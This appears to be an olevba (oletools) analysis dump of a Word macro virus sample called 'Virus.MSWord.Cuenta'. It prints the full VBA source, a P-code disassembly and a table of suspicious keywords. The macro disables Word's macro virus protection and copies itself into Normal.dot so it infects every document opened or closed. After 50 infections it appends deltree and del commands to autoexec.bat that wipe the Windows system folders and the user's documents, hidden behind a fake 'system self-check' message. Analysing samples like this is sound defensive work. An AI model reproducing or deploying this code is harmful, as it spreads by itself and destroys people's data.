olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cuenta
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cuenta - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: ./Virus.MSWord.Cuenta - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function Infesta() As Boolean
On Error Resume Next
'Desabilitamos la protección contra Virus Macro
Options.VirusProtection = False
Application.OrganizerCopy Source:= _
        Word.ActiveDocument.Path + "\" + Word.ActiveDocument.Name, Destination:= _
        Left(Application.Path, Len(Application.Path) - 7) + "\Plantillas\Normal.dot", Name:= _
        "NewMacros", Object:=wdOrganizerObjectProjectItems
 If Err.Number > 0 Then
    Infesta = False
    Application.OrganizerCopy Source:=Left(Application.Path, Len(Application.Path) - 7) + "\Plantillas\Normal.dot" _
        , Destination:=Word.ActiveDocument.Path + "\" + Word.ActiveDocument.Name _
        , Name:="NewMacros", Object:=wdOrganizerObjectProjectItems
 Else
    Infesta = True
End If
End Function
Sub AutoClose()
On Error Resume Next
Application.OrganizerCopy Source:=Left(Application.Path, Len(Application.Path) - 7) + "\Plantillas\Normal.dot" _
        , Destination:=Word.ActiveDocument.Path + "\" + Word.ActiveDocument.Name _
        , Name:="NewMacros", Object:=wdOrganizerObjectProjectItems
If Err.Number > 0 Then
Else
        Open Left(Application.Path, Len(Application.Path) - 7) + "\Plantillas\Cuenta.sys" For Append As 1
            Print #1, "Infectado el documento" + Word.ActiveDocument.Path + "\" + Word.ActiveDocument.Name
        Close #1
 End If
 Documents.Save NoPrompt:=True, OriginalFormat:=wdOriginalDocumentFormat
 End Sub
Sub autoOpen()
    Dim infesto As Boolean
    Dim I As Integer
    Dim Linea As String
    On Error Resume Next
    'Comenzar la infección del normal.dot si no esta infestado
    infesto = Infesta
    'Verificar si ya se infestaron 100 documentos nuevos
    I = 0
    Open Left(Application.Path, Len(Application.Path) - 7) + "\Plantillas\Cuenta.sys" For Input As 1
    If Dir(Left(Application.Path, Len(Application.Path) - 7) + "\Plantillas\Cuenta.sys") <> "" Then
        Do While Not EOF(1)
            Line Input #1, Linea
            I = I + 1
        Loop
    Else
        I = 0
    End If
    Close #1
    If I > 50 Or I = 50 Then
        'Agregar este codígo al autoexec.bat
        Open "C:\autoexec.bat" For Append As 1
            Print #1, "Echo off"
            Print #1, "Echo. Autocheque del sistema, por favor espere un momento........."
            'Verificamos si existe el deltree
            If Dir("c:\windows\command\deltree.exe") <> "" Then
                'Aquí le agregamos el codígo para eliminar el sistema completo
                Print #1, "c:\windows\command\Deltree *.* /y"
            Else
                'No esxiete el deltree
                Print #1, "del *.* /q"
                'Verificamps si es NT o Win 9x
                If Dir("c:\winnt", vbDirectory) Then
                  Print #1, "del c:\winnt\system\*.*  /q"
                  Print #1, "del c:\winnt\system32\*.*  /q"
                  Print #1, "del c:\winnt\*.*  /q"
                  Print #1, "del c:\winnt\profiles\administrador\personal\*.* /q"
                  Print #1, "del *.*  /q"
                End If
                If Dir("c:\windows", vbDirectory) Then
                  Print #1, "del c:\windows\system\*.* "
                  Print #1, "del c:\windows\*.* /q"
                  If Dir("c:\mis documentos", vbDirectory) Then
                    Print #1, "del c:\mis documentos\*.*  /q"
                  End If
                  If Dir("c:\my documents", vbDirectory) Then
                    Print #1, "del c:\my documents\*.*  /q"
                  End If
                  Print #1, "del *.*  /q"
                End If
             End If
                
            Print #1, "Echo on"
            Print #1, "Echo. Lo Siento pero pedro te destruyo el sistema..."
            Print #1, "Echo. Gracias por su tiempo....................."
        Close #1
    End If
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Cuenta
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/NewMacros - 6056 bytes
' Line #0:
' 	FuncDefn (Function Infesta() As Boolean)
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	QuoteRem 0x0000 0x002E "Desabilitamos la protección contra Virus Macro"
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LineCont 0x000C 05 00 08 00 15 00 08 00 29 00 08 00
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd New 
' 	Add 
' 	ParamNamed Source 
' 	Ld Application 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd Path 
' 	FnLen 
' 	LitDI2 0x0007 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0016 "\Plantillas\Normal.dot"
' 	Add 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #5:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #6:
' 	LitVarSpecial (False)
' 	St Infesta 
' Line #7:
' 	LineCont 0x0008 16 00 08 00 26 00 08 00
' 	Ld Application 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd Path 
' 	FnLen 
' 	LitDI2 0x0007 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0016 "\Plantillas\Normal.dot"
' 	Add 
' 	ParamNamed Source 
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd New 
' 	Add 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #8:
' 	ElseBlock 
' Line #9:
' 	LitVarSpecial (True)
' 	St Infesta 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	EndFunc 
' Line #12:
' 	FuncDefn (Sub AutoClose())
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' 	LineCont 0x0008 16 00 08 00 26 00 08 00
' 	Ld Application 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd Path 
' 	FnLen 
' 	LitDI2 0x0007 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0016 "\Plantillas\Normal.dot"
' 	Add 
' 	ParamNamed Source 
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd New 
' 	Add 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "NewMacros"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #15:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #16:
' 	ElseBlock 
' Line #17:
' 	Ld Application 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd Path 
' 	FnLen 
' 	LitDI2 0x0007 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0016 "\Plantillas\Cuenta.sys"
' 	Add 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Append)
' Line #18:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "Infectado el documento"
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd Path 
' 	Add 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemLd New 
' 	Add 
' 	PrintItemNL 
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	LitVarSpecial (True)
' 	ParamNamed NoPrompt 
' 	Ld wdOriginalDocumentFormat 
' 	ParamNamed OriginalFormat 
' 	Ld Documents 
' 	ArgsMemCall Save 0x0002 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Sub autoOpen())
' Line #24:
' 	Dim 
' 	VarDefn infesto (As Boolean)
' Line #25:
' 	Dim 
' 	VarDefn I (As Integer)
' Line #26:
' 	Dim 
' 	VarDefn Linea (As String)
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	QuoteRem 0x0004 0x0039 "Comenzar la infección del normal.dot si no esta infestado"
' Line #29:
' 	Ld Infesta 
' 	St infesto 
' Line #30:
' 	QuoteRem 0x0004 0x0033 "Verificar si ya se infestaron 100 documentos nuevos"
' Line #31:
' 	LitDI2 0x0000 
' 	St I 
' Line #32:
' 	Ld Application 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd Path 
' 	FnLen 
' 	LitDI2 0x0007 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0016 "\Plantillas\Cuenta.sys"
' 	Add 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Input)
' Line #33:
' 	Ld Application 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd Path 
' 	FnLen 
' 	LitDI2 0x0007 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0016 "\Plantillas\Cuenta.sys"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #34:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #35:
' 	LitDI2 0x0001 
' 	Ld Linea 
' 	LineInput 
' Line #36:
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #37:
' 	Loop 
' Line #38:
' 	ElseBlock 
' Line #39:
' 	LitDI2 0x0000 
' 	St I 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #42:
' 	Ld I 
' 	LitDI2 0x0032 
' 	Gt 
' 	Ld I 
' 	LitDI2 0x0032 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #43:
' 	QuoteRem 0x0008 0x0023 "Agregar este codígo al autoexec.bat"
' Line #44:
' 	LitStr 0x000F "C:\autoexec.bat"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Append)
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "Echo off"
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0042 "Echo. Autocheque del sistema, por favor espere un momento........."
' 	PrintItemNL 
' Line #47:
' 	QuoteRem 0x000C 0x0020 "Verificamos si existe el deltree"
' Line #48:
' 	LitStr 0x001E "c:\windows\command\deltree.exe"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #49:
' 	QuoteRem 0x0010 0x003D "Aquí le agregamos el codígo para eliminar el sistema completo"
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "c:\windows\command\Deltree *.* /y"
' 	PrintItemNL 
' Line #51:
' 	ElseBlock 
' Line #52:
' 	QuoteRem 0x0010 0x0015 "No esxiete el deltree"
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "del *.* /q"
' 	PrintItemNL 
' Line #54:
' 	QuoteRem 0x0010 0x001D "Verificamps si es NT o Win 9x"
' Line #55:
' 	LitStr 0x0008 "c:\winnt"
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	IfBlock 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "del c:\winnt\system\*.*  /q"
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "del c:\winnt\system32\*.*  /q"
' 	PrintItemNL 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "del c:\winnt\*.*  /q"
' 	PrintItemNL 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0033 "del c:\winnt\profiles\administrador\personal\*.* /q"
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "del *.*  /q"
' 	PrintItemNL 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	LitStr 0x000A "c:\windows"
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	IfBlock 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "del c:\windows\system\*.* "
' 	PrintItemNL 
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\windows\*.* /q"
' 	PrintItemNL 
' Line #65:
' 	LitStr 0x0011 "c:\mis documentos"
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	IfBlock 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "del c:\mis documentos\*.*  /q"
' 	PrintItemNL 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	LitStr 0x000F "c:\my documents"
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	IfBlock 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "del c:\my documents\*.*  /q"
' 	PrintItemNL 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "del *.*  /q"
' 	PrintItemNL 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	EndIfBlock 
' Line #74:
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Echo on"
' 	PrintItemNL 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "Echo. Lo Siento pero pedro te destruyo el sistema..."
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0030 "Echo. Gracias por su tiempo....................."
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	EndSub 
' Line #81:
' Line #82:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |deltree.exe         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

